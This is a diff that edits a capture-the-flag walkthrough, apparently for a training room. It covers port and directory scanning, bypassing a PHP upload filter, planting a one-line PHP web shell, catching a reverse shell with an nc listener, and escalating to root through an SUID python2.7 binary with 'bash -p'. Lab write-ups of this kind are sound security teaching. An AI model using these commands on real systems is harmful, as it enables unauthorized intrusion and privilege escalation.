@@ -1,111 +1,102 @@
 # Part 1 Reconnaissance
 
-First Thing first we get ip and connect to vpn then add the ip to /etc/hosts and runs a nmap scan cuz the first question is 
+First things first, we get the IP and connect to the VPN, then add the IP to `/etc/hosts` and run an Nmap scan because the first question is:
 ```
 Scan the machine, how many ports are open?
 ```
-After doing the simple nmap scan with nmap -sV <room_ip> i got
+After doing the simple Nmap scan with `nmap -sV <room_ip>` I got:
 
-<nmap_room>
+![nmap scan result](nmap_room.png)
 
 We can clearly see how many ports are open.
 
-This nmap result also reveals the answer of 2nd and 3rd question.
+This Nmap result also reveals the answers to the 2nd and 3rd questions.
 
-4th Question Doesn't needs an answer.
+The 4th question doesn't need an answer.
 
-Now the 5th Question We will use ffuf without any trouble of any additional tools.
+For the 5th question, we will use `ffuf` without the need for any additional tools.
 
-The command we will use for it is ffuf -u http://<room_ip>/FUZZ -w /home/Seclists/Discovery/Web-Content/common.txt 
+The command we will use is:
+```
+ffuf -u http://<room_ip>/FUZZ -w /home/Seclists/Discovery/Web-Content/common.txt
+```
 
-<ffuf_res>
+![ffuf result](ffuf_res.png)
 
-As we can see the unusual directory name that matches perfectly with the no of words required in 5th question is a notable directory. 
+As we can see, the unusual directory name that matches the number of words required in the 5th question is a notable directory.
 
 # Part 2 Initial Foothold
 
-At the hidden endpoint as we hit that point into the browser it allows us to upload files to server. which can be viewed at the another endpoint that is already found in ffuf result.
+At the hidden endpoint, when we hit it in the browser, it allows us to upload files to the server. Uploaded files can be viewed at another endpoint that was already found in the ffuf result.
 
-The malicious file uplaod can lead to rce. since tha page is a php file we will use <?php system($_GET['cmd']); ?> to within our file that we upload in the server. To check that sever allows us to rce or not. for this we will first unsure file uplaods then we care about its execution
+A malicious file upload can lead to RCE. Since the page is a PHP file, we will use `<?php system($_GET['cmd']); ?>` inside our uploaded file to test whether the server allows RCE. To verify this, we first ensure the file uploads, then check its execution.
 
-It allows us to upload all filetypes except php. It filter those files that have php extention. But after a bunch of tries like: -
+It allows uploading all file types except PHP — it filters files that have a `.php` extension. After a bunch of bypass attempts:
 
-Try 1  Modified filename with jpg and content type to image/jpg by burp interceptor.
+- **Try 1** — Modified filename with `.jpg` and content type to `image/jpg` via Burp interceptor.
+- **Try 2** — Modified filename with `.txt` and content type to `plain/txt` via Burp interceptor.
+- **Try 3** — Straight filename with `.php` and content type to `application/x-php` via Burp interceptor.
+- **Try 4** — Modified filename with `.php.jpg` and content type to `image/jpg` via Burp interceptor.
+- **Try 5** — Modified filename with `.php.txt` and content type to `plain/txt` via Burp interceptor.
+- **Try 6** — Straight filename with `.php` and content type to `image/jpg` via Burp interceptor.
+- **Try 7** — Straight filename with `.php` and content type to `plain/txt` via Burp interceptor.
+- **Try 8** — Modified magic header of jpg + Modified filename with `.jpg` and content type to `image/jpg` via Burp interceptor.
+- **Try 9** — Modified magic header of jpg + Modified filename with `.txt` and content type to `plain/txt` via Burp interceptor.
+- **Try 10** — Modified magic header of jpg + Straight filename with `.php` and content type to `application/x-php` via Burp interceptor.
+- **Try 11** — Modified magic header of jpg + Modified filename with `.php.jpg` and content type to `image/jpg` via Burp interceptor.
+- **Try 12** — Modified magic header of jpg + Modified filename with `.php.txt` and content type to `plain/txt` via Burp interceptor.
+- **Try 13** — Modified filename with `.php5` and content type to `plain/txt` via Burp interceptor.
 
-Try 2  Modified filename with txt and content type to plain/txt by burp interceptor.
+![file upload bypass](file_upload.png)
 
-Try 3  Straight filename with php and content type to application/x-php by burp interceptor.
+# Getting a Shell - Part 3
 
-Try 4  Modified filename with .php.jpg and content type to image/jpg by burp interceptor.
+After the file successfully uploads, we check its execution at the upload endpoint.
 
-Try 5  Modified filename with .php.txt and content type to plain/txt by burp interceptor.
+We will hit this URL: `http://<ip>/<upload_endpoint>?cmd=whoami`
 
-Try 6  Straight filename with php and content type to image/jpg by burp interceptor.
+If we get any output back, we can now get a shell.
 
-Try 7  Straight filename with php and content type to plain/txt by burp interceptor.
+Go to [revshells.com](https://revshells.com), copy the IP under your `tun0` interface and enter it there. On your local machine, set up the listener with `nc -lvnp 4444`, then copy and generate the simplest Python reverse shell command.
 
-Try 8  Modified magic header of jpg + Modified filename with jpg and content type to image/jpg by burp interceptor.
-
-Try 9  Modified magic header of jpg + Modified filename with txt and content type to plain/txt by burp interceptor.
-
-Try 10 Modified magic header of jpg + Modified filename with php and content type to application/x-php by burp interceptor.
-
-Try 11 Modified magic header of jpg + Modified filename with .php.jpg and content type to image/jpg by burp interceptor.
-
-Try 12 Modified magic header of jpg + Modified filename with .php.txt and content type to plain/txt by burp interceptor.
-
-Try 13 Modified filename with .php5 and content type of plain/txt by burp interceptor.
-
-<file_upload>
-
-# Getting a shell - Part 3
-After the file succeesfully uplaods we will check its execution at the uploaded endpoint.
-
-We will hit this url http://<ip>/<upload_endpoint>?cmd=whoami
-
-If we get any text congrats we can now get a shell.
-
-Go to revshells.com and copy the ip under your tun0 interface and enter there as ip and now onto your local machine set up the listerner by nc -lvnp 4444. and also copy the reverse shell command and generate one with python simplest
-
-As you hit this endpoint
-
+When you hit this endpoint:
 ```
-http://<ip>/<upload_endpoint>/cmd=<reverse_shell_command>
+http://<ip>/<upload_endpoint>?cmd=<reverse_shell_command>
 ```
-You will get your connection back into the terminal and you have a shell now.
+You will get a connection back in your terminal and you now have a shell.
 
-Now do find here and there and you will get the user flag at /var/www in the shell. 
+Poke around and you will find the user flag at `/var/www` in the shell.
 
-<user_flag>
+![user flag](user_flag.png)
 
-And in this way Q6. gets solved.
+And that's how Q6 gets solved.
 
-# Privilage Escalation Part - 3
-Now Get to our Q7. we will execute the command that we have given in the hint to the rev_shell
+# Privilege Escalation - Part 4
 
-<perm_image>
+For Q7, we will run the command given in the hint inside the reverse shell:
 
-Now spot the file from the above image that which file permission is weired.
+![SUID permissions](perm_image.png)
 
-And after that Name that file into the question 7.
+Spot the file from the above image whose permission looks unusual.
 
-Now as the hint of Q8 tells us that search for that binary on gtfobins.
+Name that file as the answer to question 7.
 
-When i searched for it i got
+As the hint for Q8 suggests, search for that binary on GTFOBins.
 
-<gtfo_bins>
+Searching for it gives:
 
-Here you can clearly see the command python3 -c 'import os; os.execl("/bin/sh", "sh")'
+![gtfobins result](gtfo_bins.png)
 
-But this command was not working. Its a classic one
+Here you can clearly see the command `python3 -c 'import os; os.execl("/bin/sh", "sh")'`.
 
-it failed cuz the binary might have suid bit set, but when you spawn a shell through os.execl, the shell drops privilages for safety. Modern bin/sh(dash) and /bin/bash do this by default.
+However, this command doesn't work. It's a classic gotcha —
+it fails because the binary has the SUID bit set, but when you spawn a shell through `os.execl`, the shell drops privileges for safety. Modern `/bin/sh` (dash) and `/bin/bash` both do this by default.
 
-We are going to use -p to keep privilages the **working** command is 
+We use `-p` to preserve privileges. The **working** command is:
 ```
 python2.7 -c 'import os; os.execl("/bin/bash", "bash", "-p")'
 ```
 
-The -p option tells bash don't drop the SUID privileges.
+The `-p` option tells Bash not to drop the SUID privileges.
 
-Now doing the similar enumuration like Q6. You will got your answer as find into it.
+Now, doing similar enumeration as in Q6, you will find the root flag.
